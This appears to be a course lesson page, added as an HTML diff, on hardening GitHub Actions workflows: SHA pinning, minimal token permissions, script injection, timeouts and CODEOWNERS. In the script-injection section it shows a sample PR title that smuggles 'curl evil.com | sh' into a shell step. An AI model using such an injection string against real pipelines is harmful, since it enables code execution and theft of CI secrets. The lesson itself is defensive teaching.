@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lesson 26 — Hardening GitHub Actions Workflows</title>
+  <link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+  <div class="lesson-meta">
+    <span class="number">LESSON 26</span> &middot; Security Deep Dive &middot; ~20 minutes
+  </div>
+
+  <h1>Hardening GitHub Actions Workflows</h1>
+  <p>Your pipeline is a high-value target: it has secrets, pushes to registries, and can deploy to production. This lesson teaches you to defend it against supply chain attacks, injection, and credential theft.</p>
+
+  <div class="progress">
+    <span>Lesson 26 of 33</span>
+    <div class="progress-bar"><div class="progress-fill" style="width: 78%"></div></div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <h2>Attack Surface of a CI/CD Pipeline</h2>
+
+  <div class="diagram">
+    <svg viewBox="0 0 720 180" xmlns="http://www.w3.org/2000/svg">
+      <!-- Attack vectors -->
+      <rect x="20" y="10" width="680" height="160" rx="8" fill="#ffebee" stroke="#c62828"/>
+      <text x="360" y="30" text-anchor="middle" font-size="10" font-weight="bold" fill="#c62828">CI/CD Attack Vectors</text>
+      
+      <rect x="35" y="45" width="195" height="55" rx="4" fill="white" stroke="#ef9a9a"/>
+      <text x="132" y="62" text-anchor="middle" font-size="8" font-weight="bold" fill="#c62828">① Dependency Poisoning</text>
+      <text x="132" y="77" text-anchor="middle" font-size="7" fill="#555">Malicious npm/pip package</text>
+      <text x="132" y="90" text-anchor="middle" font-size="7" fill="#555">executes in your pipeline</text>
+      
+      <rect x="245" y="45" width="195" height="55" rx="4" fill="white" stroke="#ef9a9a"/>
+      <text x="342" y="62" text-anchor="middle" font-size="8" font-weight="bold" fill="#c62828">② Action Compromise</text>
+      <text x="342" y="77" text-anchor="middle" font-size="7" fill="#555">Typosquat or hijacked action</text>
+      <text x="342" y="90" text-anchor="middle" font-size="7" fill="#555">steals your secrets</text>
+      
+      <rect x="455" y="45" width="230" height="55" rx="4" fill="white" stroke="#ef9a9a"/>
+      <text x="570" y="62" text-anchor="middle" font-size="8" font-weight="bold" fill="#c62828">③ Script Injection</text>
+      <text x="570" y="77" text-anchor="middle" font-size="7" fill="#555">PR title/body interpolated into shell</text>
+      <text x="570" y="90" text-anchor="middle" font-size="7" fill="#555">→ arbitrary code execution</text>
+      
+      <rect x="35" y="110" width="195" height="45" rx="4" fill="white" stroke="#ef9a9a"/>
+      <text x="132" y="127" text-anchor="middle" font-size="8" font-weight="bold" fill="#c62828">④ Over-Privileged Token</text>
+      <text x="132" y="142" text-anchor="middle" font-size="7" fill="#555">GITHUB_TOKEN can write to any file</text>
+      
+      <rect x="245" y="110" width="195" height="45" rx="4" fill="white" stroke="#ef9a9a"/>
+      <text x="342" y="127" text-anchor="middle" font-size="8" font-weight="bold" fill="#c62828">⑤ Secret Exposure</text>
+      <text x="342" y="142" text-anchor="middle" font-size="7" fill="#555">Secret leaked in logs/artifacts</text>
+      
+      <rect x="455" y="110" width="230" height="45" rx="4" fill="white" stroke="#ef9a9a"/>
+      <text x="570" y="127" text-anchor="middle" font-size="8" font-weight="bold" fill="#c62828">⑥ Fork PR Attack</text>
+      <text x="570" y="142" text-anchor="middle" font-size="7" fill="#555">Fork runs workflow with access</text>
+      <text x="570" y="155" text-anchor="middle" font-size="7" fill="#555">to secrets (if misconfigured)</text>
+    </svg>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <h2>The Hardening Checklist</h2>
+
+  <h3>1. Pin Actions to SHA (Not Tags)</h3>
+  <div class="compare">
+    <div class="compare-bad">
+<pre style="font-size:0.75rem; margin:0;">- uses: actions/checkout@v4
+- uses: some-user/action@main</pre>
+      <p style="font-size:0.75rem; margin-top:0.3rem;">Tags and branches can be force-pushed. <code>@main</code> can change any time.</p>
+    </div>
+    <div class="compare-good">
+<pre style="font-size:0.75rem; margin:0;">- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+  # v4.1.1 pinned to exact commit</pre>
+      <p style="font-size:0.75rem; margin-top:0.3rem;">SHA is immutable. Even if the action repo is compromised later, your pin is safe.</p>
+    </div>
+  </div>
+
+  <h3>2. Minimal Permissions</h3>
+  <div class="compare">
+    <div class="compare-bad">
+<pre style="font-size:0.75rem; margin:0;"># No permissions block = read+write ALL
+name: CI
+on: push
+jobs: ...</pre>
+    </div>
+    <div class="compare-good">
+<pre style="font-size:0.75rem; margin:0;">permissions:
+  contents: read    # Only what's needed
+  id-token: write   # Only for OIDC
+  # Everything else = none</pre>
+    </div>
+  </div>
+
+  <h3>3. Prevent Script Injection</h3>
+  <div class="compare">
+    <div class="compare-bad">
+<pre style="font-size:0.75rem; margin:0;"># If PR title is: "; curl evil.com | sh; echo "
+- run: echo "PR: ${{ github.event.pull_request.title }}"</pre>
+      <p style="font-size:0.75rem; margin-top:0.3rem;">Untrusted input interpolated directly into shell = RCE</p>
+    </div>
+    <div class="compare-good">
+<pre style="font-size:0.75rem; margin:0;">- env:
+    PR_TITLE: ${{ github.event.pull_request.title }}
+  run: echo "PR: $PR_TITLE"</pre>
+      <p style="font-size:0.75rem; margin-top:0.3rem;">Environment variable = data, not code. Safe.</p>
+    </div>
+  </div>
+
+  <h3>4. Timeouts & Concurrency</h3>
+<pre><code><span style="color:#89b4fa">jobs:</span>
+  <span style="color:#89b4fa">build:</span>
+    <span style="color:#89b4fa">timeout-minutes:</span> <span style="color:#a6e3a1">15</span>           <span style="color:#6c7086"># Never run forever</span>
+    <span style="color:#89b4fa">runs-on:</span> <span style="color:#a6e3a1">ubuntu-latest</span>
+
+<span style="color:#89b4fa">concurrency:</span>
+  <span style="color:#89b4fa">group:</span> <span style="color:#a6e3a1">${{ github.workflow }}-${{ github.ref }}</span>
+  <span style="color:#89b4fa">cancel-in-progress:</span> <span style="color:#a6e3a1">true</span>      <span style="color:#6c7086"># Prevent resource exhaustion</span>
+</code></pre>
+
+  <h3>5. Protect Workflow Changes</h3>
+<pre><code><span style="color:#6c7086"># .github/CODEOWNERS</span>
+.github/workflows/    @security-team @platform-team
+.github/actions/      @security-team
+Dockerfile            @security-team
+</code></pre>
+  <p>Require review from security/platform team for ANY workflow change.</p>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <h2>The Hardened Workflow Template</h2>
+
+<pre><code><span style="color:#89b4fa">name:</span> <span style="color:#a6e3a1">CI (Hardened)</span>
+
+<span style="color:#89b4fa">on:</span>
+  <span style="color:#89b4fa">push:</span>
+    <span style="color:#89b4fa">branches:</span> <span style="color:#a6e3a1">[main]</span>
+  <span style="color:#89b4fa">pull_request:</span>
+
+<span style="color:#6c7086"># MINIMAL permissions</span>
+<span style="color:#89b4fa">permissions:</span>
+  <span style="color:#89b4fa">contents:</span> <span style="color:#a6e3a1">read</span>
+
+<span style="color:#6c7086"># Prevent resource exhaustion</span>
+<span style="color:#89b4fa">concurrency:</span>
+  <span style="color:#89b4fa">group:</span> <span style="color:#a6e3a1">${{ github.workflow }}-${{ github.ref }}</span>
+  <span style="color:#89b4fa">cancel-in-progress:</span> <span style="color:#a6e3a1">true</span>
+
+<span style="color:#89b4fa">jobs:</span>
+  <span style="color:#89b4fa">build:</span>
+    <span style="color:#89b4fa">runs-on:</span> <span style="color:#a6e3a1">ubuntu-latest</span>
+    <span style="color:#89b4fa">timeout-minutes:</span> <span style="color:#a6e3a1">15</span>
+    <span style="color:#89b4fa">steps:</span>
+      <span style="color:#6c7086"># Pin to SHA</span>
+      - <span style="color:#89b4fa">uses:</span> <span style="color:#a6e3a1">actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11</span>
+        <span style="color:#89b4fa">with:</span>
+          <span style="color:#89b4fa">persist-credentials:</span> <span style="color:#a6e3a1">false</span>  <span style="color:#6c7086"># Don't leave creds around</span>
+
+      <span style="color:#6c7086"># Use env for untrusted input</span>
+      - <span style="color:#89b4fa">name:</span> <span style="color:#a6e3a1">Process safely</span>
+        <span style="color:#89b4fa">env:</span>
+          <span style="color:#89b4fa">COMMIT_MSG:</span> <span style="color:#a6e3a1">${{ github.event.head_commit.message }}</span>
+        <span style="color:#89b4fa">run:</span> <span style="color:#a6e3a1">echo "Building for commit: $COMMIT_MSG"</span>
+</code></pre>
+
+  <!-- ═══════════════════════════════════════════════════════ -->
+  <h2>🧠 Recall Check</h2>
+
+  <div class="recall">
+    <ol>
+      <li>Why pin actions to SHA instead of a version tag like <code>@v4</code>?</li>
+      <li>What's the injection attack when you write <code>run: echo "${{ github.event.pull_request.title }}"</code>?</li>
+      <li>What does <code>permissions: contents: read</code> prevent?</li>
+      <li>Name three things CODEOWNERS should protect in a repo.</li>
+    </ol>
+    <details>
+      <summary>Reveal answers</summary>
+      <ol>
+        <li>Tags can be moved (force-pushed) to point to different code. A compromised action maintainer can change what <code>@v4</code> points to. SHA is immutable — it ALWAYS refers to the same commit.</li>
+        <li>The PR title is <strong>user-controlled input</strong>. If it contains <code>"; malicious-command; echo "</code>, it breaks out of the echo and executes arbitrary commands with your pipeline's permissions and secrets.</li>
+        <li>Without explicit permissions, the GITHUB_TOKEN defaults to read+write on many scopes. Setting <code>contents: read</code> means the token can only read code, not push commits, create releases, etc.</li>
+        <li><code>.github/workflows/</code> (pipeline definitions), <code>.github/actions/</code> (custom actions), <code>Dockerfile</code> (build definitions). These control what runs in your pipeline — unauthorized changes = supply chain attack.</li>
+      </ol>
+    </details>
+  </div>
+
+  <div class="key-insight">
+    Security isn't a feature you add later — it's a property of how you write pipelines from day one. The hardening checklist: <strong>pin SHAs, minimal permissions, env vars for untrusted input, timeouts, CODEOWNERS</strong>. Apply these to every workflow you write.
+  </div>
+
+  <p><strong>Next lesson:</strong> Image Signing & Verification — proving your images came from YOUR pipeline.</p>
+
+</body>
+</html>
